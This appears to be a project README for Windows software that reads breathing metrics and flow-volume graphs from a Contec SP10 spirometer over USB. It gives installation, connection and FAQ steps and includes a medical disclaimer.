📋 About This Project

This software allows you to connect a Contec SP10 spirometer to your Windows computer. It captures important breathing metrics like FVC, FEV1, and PEF. You can also view flow-volume and volume-time graphs to track your lung health over time. This repository provides the tools needed to pull data from your medical device through a standard USB connection.

⚙️ System Requirements

Please ensure your computer meets these requirements before you begin the setup process:

  • Windows 10 or Windows 11 operating system.
  • One available USB 2.0 port for the device cable.
  • An internet connection for initial setup.
  • The Contec SP10 handheld spirometer.

📥 How to Install

Follow these steps to set up the software on your machine:

  1. Visit the releases page to find the latest version.
  2. Select the file ending in .exe to download the installer to your computer.
  3. Open the file once the download finishes.
  4. Follow the prompts on your screen to complete the installation.
  5. Restart your computer if the installer asks you to finish the process.

🔌 Connecting Your Device

Once you install the software, connect the hardware to your computer. Use the USB cable provided with your spirometer. Windows will detect the device automatically. If the software does not recognize the device, unplug the cable and plug it into a different USB port. The light on the spirometer should turn on when it receives power from the computer.

📊 Viewing Your Data

Launch the application from your desktop shortcut. You will see a dashboard showing the status of your connection. Once you perform a test on the device, the software will import the readings instantly. You can view your peak flow and volume results in the main window. Click on the history tab to compare your current results with past tests.

❓ Frequent Questions

The software does not find my device. Check the USB cable connection first. Ensure the device has batteries installed or is receiving power. Restart the application while the device is plugged in.

Can I export my data? Yes, the software allows you to save your breathing curves and text reports to your local drive for your personal records.

Is this software meant for diagnostic purposes? This tool displays data for the user. Always consult a medical professional regarding your lung health metrics.
